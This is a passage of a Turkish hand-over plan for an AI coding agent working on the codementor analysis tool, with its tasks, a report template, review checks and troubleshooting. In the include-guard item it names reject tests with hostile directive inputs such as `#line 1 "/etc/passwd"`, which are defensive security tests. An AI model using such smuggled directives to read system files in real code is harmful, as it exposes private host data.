| Sıcak yol | `Update()` yöntemi MonoBehaviour'dan türemeyen sınıfta (ya da UCLASS olmayan `Tick`) | sıcak yol SAYILMAZ |

### H3 — Analiz verisi
- **`data/call_costs.yaml`:** `memset`, `memcpy`, `GetAllActorsOfClass`, `TArray::Remove`, `RemoveAll`,
  `RemoveAt`, `Insert` ZATEN VAR. Yapılacak: `List.RemoveAt(0)` ve `List.Insert(0, …)`'ın O(n)
  olduğunu ve `RemoveAt(son)`'un O(1) olduğunu ayırt etmek mümkünse (argüman `0` sabiti) yap; değilse
  rapora "mevcut ayrım yeterli/yetersiz" diye yaz.
- **`parse_bigo`** (`src/codementor/models/bigo.py::parse_bigo`, ayrıştırıcı
  `models/_bigo_parser.py`): önce dene:
  ```powershell
  uv run python -c "from codementor.models.bigo import parse_bigo; print(parse_bigo('log log n'))"
  ```
  Bugün `Θ(n)` → `BigOParseError` (doğrulandı). Ekle: `Θ(...)`, `Ω(...)` → içindeki ifade (O gibi ele al;
  gösterimde O'ya çevrilebilir), `max(n, m)`, değişken üs `n^k` (çalışmıyorsa), `log log n`
  (çalışmıyorsa). Her biri için `tests/unit/test_bigo.py`'ye örnek; `parse_bigo` 40 KB anlamsız girdide
  hızlı hata veriyor (süre testi).
- **Maskeleme** (`src/codementor/analysis/lexical.py::mask_non_code`, ~89): C# 11 ham metin
  `"""…"""` (ve `$"""…"""`) içeriği maskelensin; fonksiyona `language: Language | None = None` parametresi
  (C# dışında eski davranış). Testler: ham metin içindeki `//` ve `/*` yorum sanılmıyor; satır/uzunluk
  korunuyor.
- **Unreal stub** (`data/stubs/ue_stubs.h`): `FMath` (Clamp, Abs, Max, Min, Sqrt), `FHitResult`,
  `DECLARE_DYNAMIC_MULTICAST_DELEGATE*` makroları, `GetWorldTimerManager()`, `FTimerHandle`.
  Sonra `uv run pytest -m compiler` (zig ya da clang kuruluysa koşar; değilse "atlandı" yaz).
- **Include koruması `#pragma`/`#line` izin listesi:** GÜVENLİK. `src/codementor/validation/include_guard.py`.
  YAPACAKSAN: yalnız `#pragma once`, `#pragma region/endregion`, `#line <sayı>` (dosya adı OLMADAN) izin;
  `tests/unit/test_include_guard.py`'deki tüm red testleri hâlâ geçmeli ve kendi red testlerini ekle
  (`#line 1 "/etc/passwd"`, `#pragma GCC dependency "…"` RED). Emin değilsen YAPMA, rapora yaz.
- **Kolon birimi:** Tier 1 gcc/clang komutuna `-fdiagnostics-column-unit=byte`
  (`rg -n "fsyntax-only" src/codementor/validation`), Tier 0 ile aynı birim. Desteklemeyen derleyici
  sürümünde hata vermemeli (sonda gerekirse); compiler testleri.

### H4 — Ölçüm
- Statik dev eval: `uv run codementor eval run --split dev --static-only` → `eval/results/<zaman>_static_none_static_dev.json`.
- Karşılaştır: `uv run codementor eval compare (Get-ChildItem eval\results\*static*_dev.json)`.
  Precision düşmüşse (yeni kural yanlış pozitif veriyor) kuralı düzelt; önce/sonra tabloyu rapora koy.
- README'deki "Yalnızca statik" satırları sonuç dosyalarından üretilir ve
  `tests/unit/eval/test_readme_table.py` bunu denetler; README'yi bu teste uyacak biçimde güncelle
  (testi değiştirme). Eski sonuç dosyalarını SİLME.

**Faz H kabul:** her yeni kural fixture + süre testi; `rules doc` ile katalog; README kural sayısı;
yeni statik dev eval sonucu commit'te; dört denetim; §3.1 Linux taklidi.

---

## 9. Faz I — YAPMA

Yerel modeller (eski Faz 64-66) Ollama ve canlı model denemesi gerektirir. Kullanıcı Ollama
kullanılmamasını istedi; canlı ölçüm token harcar. Bu devirde Faz I'ya DOKUNMA.

---

## 10. Faz J — İsteğe bağlı

Yalnız E-H bittiyse. Her biri ayrı dal (`faz/j-<konu>`) ve ayrı commit:
- **Zig budama:** `validation/toolchain_install.py` kurulumdan sonra kullanılmayan libc başlık dizinlerini
  siler (382 MB → <150 MB). Hangi dizinlerin gerektiğini `tests/compiler/test_tier1_zig.py` ile doğrula;
  `uv run pytest -m compiler` geçmeli. Emin değilsen YAPMA.
- **Kontrol listesi anlık görüntü testi:** `data/checklists/*.yaml` içeriğinin sha256 özetini sabitleyen
  test; değişince "bilinçli mi" diye düşürür (golden deseni, `--update-golden` ile güncellenebilir).
- **YAPMA:** imzalı exe / Inno Setup (sertifika), cppcheck/clang-tidy, VS Code eklentisi, Rust/Go/JS
  desteği, `session_id`'yi anahtara bağlama (tasarım kararı).

---

## 11. Kullanıcının kendi yapacakları

Bunlara DOKUNMA:
- **Y2:** `tests/fixtures/llm_responses/unity03_reference.cs` ↔ `private/` altındaki unity-03 referans
  çözümü karşılaştırması. `private/`'ı okuma, değiştirme.
- GitHub ayarları (secret scanning, push protection, Dependabot alerts); repoyu public yapmak.
- main'e birleştirme, push, sürüm, etiket.

---

## 12. Teslim raporu şablonu

İlerledikçe `docs/YAPILANLAR_FAZ_E_J_ANTIGRAVITY.md` dosyasını doldur; her fazın son commit'ine kat.
(Rapor dosyası her dalda ayrı ayrı güncellenir; son hâli en son çalıştığın dalda.)

```markdown
# Faz E-J — Antigravity teslim raporu (<başlangıç tarihi> – <bitiş tarihi>)

## Özet
| Faz | Dal | Son commit | Durum | Madde (✅/⚠️/❌) |
|---|---|---|---|---|
| E | faz/e-web | abc1234 | tam / yarım / yapılmadı | 10/1/1 |

## Faz E
### E1 — GET /v1/analyses — ✅
- Değişen dosyalar: `src/codementor/api/routes.py`, `src/codementor/storage/cache.py`, `src/codementor/models/api.py`, `schemas/…`, `web/src/types/…`
- Yeni testler: `tests/api/test_analyses_list.py` (6 test: test_empty_list, …)
- Mutasyon kontrolü: `list_stored` geri alınınca 6/6 test düştü
- Karar/not: …
### E2 — … — ⚠️ (yarım: oturum silme yapıldı, toplu silme yapılamadı çünkü …)
(her madde için aynı)

## Denetim komutlarının GERÇEK çıktısı (son satırları kopyala-yapıştır, her dal için)
### faz/e-web
- `uv run ruff check .` → …
- `uv run ruff format --check .` → …
- `uv run mypy src/` → …
- `uv run pytest -m "not live"` → `NNNN passed, NN skipped, N deselected in …`
- Linux taklidi (§3.1) → `NNNN passed …`
- web: typecheck → … · test → `Tests  NN passed` · build → … · e2e → …
- `git diff main...faz/e-web --stat -- tests/` → (çıktı; var olan test dosyasında silme/gevşetme yok)

## Yapamadıklarım ve neden
## Mimariden sapma gerektiren öneriler (uygulanmadı)
## Var olan bir testi değiştirdiysem: hangisi, neden
## Claude Code'un özellikle bakmasını istediğim yerler
```

**Kurallar:** sayıları komut çıktısından KOPYALA. Yapmadığını ✅ işaretleme. "Testler geçti" demek
yerine çıktının son satırını yapıştır.

---

## 13. Claude Code'un denetimde bakacakları

1. Her dalda dört denetim + Linux taklidi + web denetimleri; rapordaki sayılarla karşılaştırma.
2. `git diff <önceki dal>...<dal> -- tests/` (E için önceki dal = main): var olan testte silme, `skip`/`xfail`, gevşetilmiş beklenti ya da
   büyütülmüş süre eşiği = o madde reddedilir.
3. Her yeni test için mutasyon kontrolü (düzeltmeyi geri alıp testi koşma); düşmeyen test = madde reddedilir.
4. Görünmez karakter taraması (§3.3), 400 satır, mypy strict, tkinter'sız içe aktarma.
5. Güvenlik maddeleri (E4-E8, E11, E12, H3 include, F10) kendi kötü niyetli girdileriyle denenir.
6. Elle deneme: web (`codementor serve` + `npm run dev`), masaüstü.
7. Bağımsız kod-denetci incelemesi; bulgular düzeltilmeden hiçbir dal main'e birleşmez.

---

## 14. Bir şey ters giderse

| Belirti | Ne yap |
|---|---|
| `uv sync` hata veriyor | `uv --version` ve Python 3.12 var mı bak; `uv.lock`'u DEĞİŞTİRME; rapora yaz |
| Bir test yalnız tam koşuda düşüyor, tek başına geçiyor | testler arası sızıntı (ortam değişkeni, global önbellek, `~/.codementor`): §3.2. `tests/conftest.py`'deki yalıtım fikstürlerini incele |
| `ModuleNotFoundError: tkinter` (Linux taklidinde) | §3.1: modül en üstte Tk içe aktarıyor |
| `test_schema_export` düşüyor | §1.3 üretimini unuttun |
| Golden test düşüyor | §3.6 |
| Test adı/kurulum hatası (`OSError`, çok uzun yol) | parametreli testte büyük girdi var; `ids=[...]` ver |
| Regex testi dakikalarca sürüyor | karesel/üstel desen; §3.4. Koşuyu durdur (Ctrl+C), deseni iyelik nicelikleriyle yeniden yaz |
| `git stash pop` çakışma veriyor | `git stash show -p` ile içeriği gör; elle birleştir; `git stash drop` ancak içerik kurtarıldıysa |
| Masaüstü testi asılı kalıyor | `mainloop()` çağrılmış olabilir; testte `App.mainloop` çağırma, `_open` yardımcısını kullan |
| CI'a benzer bir hata görüp emin değilsin | Değişikliği geri al, maddeyi "yapılamadı" işaretle, belirtiyi rapora yaz. Yanlış düzeltme, yapılmamış düzeltmeden kötüdür |
